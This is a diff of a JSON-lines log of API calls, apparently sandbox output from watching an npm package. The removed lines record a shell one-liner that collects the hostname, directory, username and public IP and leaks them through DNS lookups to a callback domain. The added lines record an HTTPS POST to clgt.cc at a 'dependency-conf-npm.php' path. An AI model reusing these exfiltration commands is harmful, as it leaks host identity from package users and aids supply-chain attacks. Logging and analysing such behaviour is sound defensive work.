@@ -1,12 +1,2 @@
-{"timestamp":1748866057323,"api":"fs.writeFileSync","args":["dynamic_log.txt","Triggered dynamic API"]}
-{"timestamp":1748876681724,"api":"fs.writeFileSync","args":["dynamic_log.txt","Triggered dynamic API"]}
-{"timestamp":1748887134665,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
-{"timestamp":1748887512727,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
-{"timestamp":1748887868393,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
-{"timestamp":1748887942863,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
-{"timestamp":1748892225590,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
-{"timestamp":1748892985307,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
-{"timestamp":1748893790440,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
-{"timestamp":1748894177700,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
-{"timestamp":1748894269025,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
-{"timestamp":1748894286365,"api":"child_process.exec","args":["a=$(hostname;pwd;whoami;echo 'niroborg-npm-com-test';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $ut.bind9-or-callback-server.com;done",null]}
+{"timestamp":1748955847575,"api":"os.hostname","args":[]}
+{"timestamp":1748955847578,"api":"https.request","args":["{\"hostname\":\"clgt.cc\",\"port\":443,\"path\":\"/dependency-conf-npm.php\",\"method\":\"POST\",\"headers\":{\"Content-Type\":\"application/x-www-form-urlencoded\",\"Content-Length\":25393}}",null]}
